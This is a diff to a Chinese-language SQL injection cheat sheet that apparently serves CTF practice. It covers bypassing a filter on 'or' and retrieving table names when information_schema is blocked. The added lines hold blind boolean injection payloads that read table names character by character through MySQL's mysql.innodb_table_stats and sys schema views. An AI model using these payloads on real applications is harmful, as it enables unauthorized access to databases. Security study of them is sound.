@@ -17,11 +17,17 @@ select(group_concat(table_name))from(information_schema.tables)where(table_schem
 将后面的单引号闭合即可。
 
 ^
-## **or 被过滤，orderby、information_schema都不能用**
+## **or 被过滤导致orderby、information_schema都不能用**
 用其他逻辑运算符and ， && ， &， |  ,1^1^
-查表名使用 select group_concat(table_name）from mysql.innodb_table_stats wheredatabase_name=database()
-
+查表名使用 
+```
+select group_concat(table_name）from mysql.innodb_table_stats wheredatabase_name=database()
+```
 如果information_schema被禁止，通过sys.schema获取当前数据库表名
+```
+1&&ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),1,1))=103
+2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),{},1))={}.format()
+```
 通过无列名注入获取表group_concat(某一字段所有值)。
 <https://www.cnblogs.com/hello-there/p/12918265.html>
 
